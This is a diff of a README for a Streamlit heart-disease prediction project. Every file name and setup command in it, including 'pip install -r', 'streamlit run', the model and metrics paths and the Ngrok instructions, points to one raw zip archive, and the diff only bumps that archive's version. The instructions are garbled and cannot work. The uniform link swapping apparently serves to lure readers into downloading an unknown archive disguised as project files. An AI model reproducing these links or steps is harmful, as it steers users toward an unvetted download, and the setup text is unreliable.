@@ -17,13 +17,13 @@ It predicts the likelihood of heart disease based on user health data.
 ```
 Heart_Disease_Project/
 │
-├── https://github.com/MoHussein197/heart-disease-prediction/raw/refs/heads/main/data/heart_prediction_disease_v1.0.zip           # Main ML pipeline and app logic
-├── https://github.com/MoHussein197/heart-disease-prediction/raw/refs/heads/main/data/heart_prediction_disease_v1.0.zip          # Saved trained Random Forest model
-├── https://github.com/MoHussein197/heart-disease-prediction/raw/refs/heads/main/data/heart_prediction_disease_v1.0.zip            # Python dependencies
-├── https://github.com/MoHussein197/heart-disease-prediction/raw/refs/heads/main/data/heart_prediction_disease_v1.0.zip                   # This README file
+├── https://github.com/MoHussein197/heart-disease-prediction/raw/refs/heads/main/notebooks/heart_prediction_disease_v3.2-beta.2.zip           # Main ML pipeline and app logic
+├── https://github.com/MoHussein197/heart-disease-prediction/raw/refs/heads/main/notebooks/heart_prediction_disease_v3.2-beta.2.zip          # Saved trained Random Forest model
+├── https://github.com/MoHussein197/heart-disease-prediction/raw/refs/heads/main/notebooks/heart_prediction_disease_v3.2-beta.2.zip            # Python dependencies
+├── https://github.com/MoHussein197/heart-disease-prediction/raw/refs/heads/main/notebooks/heart_prediction_disease_v3.2-beta.2.zip                   # This README file
 ├── results/                    # Folder for evaluation metrics
-│   └── https://github.com/MoHussein197/heart-disease-prediction/raw/refs/heads/main/data/heart_prediction_disease_v1.0.zip
-├── https://github.com/MoHussein197/heart-disease-prediction/raw/refs/heads/main/data/heart_prediction_disease_v1.0.zip             # Instructions to set up Ngrok for deployment
+│   └── https://github.com/MoHussein197/heart-disease-prediction/raw/refs/heads/main/notebooks/heart_prediction_disease_v3.2-beta.2.zip
+├── https://github.com/MoHussein197/heart-disease-prediction/raw/refs/heads/main/notebooks/heart_prediction_disease_v3.2-beta.2.zip             # Instructions to set up Ngrok for deployment
 ```
 
 ---
@@ -48,7 +48,7 @@ venv\Scripts\activate         # On Windows
 3. **Install dependencies**
 
 ```bash
-pip install -r https://github.com/MoHussein197/heart-disease-prediction/raw/refs/heads/main/data/heart_prediction_disease_v1.0.zip
+pip install -r https://github.com/MoHussein197/heart-disease-prediction/raw/refs/heads/main/notebooks/heart_prediction_disease_v3.2-beta.2.zip
 ```
 
 ---
@@ -58,12 +58,12 @@ pip install -r https://github.com/MoHussein197/heart-disease-prediction/raw/refs
 1. **Run the Streamlit app**
 
 ```bash
-streamlit run https://github.com/MoHussein197/heart-disease-prediction/raw/refs/heads/main/data/heart_prediction_disease_v1.0.zip
+streamlit run https://github.com/MoHussein197/heart-disease-prediction/raw/refs/heads/main/notebooks/heart_prediction_disease_v3.2-beta.2.zip
 ```
 
 2. **Optional: Deploy with Ngrok**
 
-* Follow instructions in `https://github.com/MoHussein197/heart-disease-prediction/raw/refs/heads/main/data/heart_prediction_disease_v1.0.zip`
+* Follow instructions in `https://github.com/MoHussein197/heart-disease-prediction/raw/refs/heads/main/notebooks/heart_prediction_disease_v3.2-beta.2.zip`
 * Run the command provided to get a public URL for your app
 
 ---
@@ -74,13 +74,13 @@ streamlit run https://github.com/MoHussein197/heart-disease-prediction/raw/refs/
 * **Preprocessing:** Scaling, one-hot encoding for categorical features
 * **Feature Selection:** RFE and Chi-Square test
 * **Models:** Logistic Regression, Decision Tree, Random Forest, SVM
-* **Final Model:** Random Forest trained on selected features, saved as `https://github.com/MoHussein197/heart-disease-prediction/raw/refs/heads/main/data/heart_prediction_disease_v1.0.zip`
+* **Final Model:** Random Forest trained on selected features, saved as `https://github.com/MoHussein197/heart-disease-prediction/raw/refs/heads/main/notebooks/heart_prediction_disease_v3.2-beta.2.zip`
 
 ---
 
 ## Evaluation Metrics
 
-* Metrics for all models are saved in `https://github.com/MoHussein197/heart-disease-prediction/raw/refs/heads/main/data/heart_prediction_disease_v1.0.zip`
+* Metrics for all models are saved in `https://github.com/MoHussein197/heart-disease-prediction/raw/refs/heads/main/notebooks/heart_prediction_disease_v3.2-beta.2.zip`
 * Includes: Accuracy, Precision, Recall, F1 Score, AUC (if applicable)
 
 ---
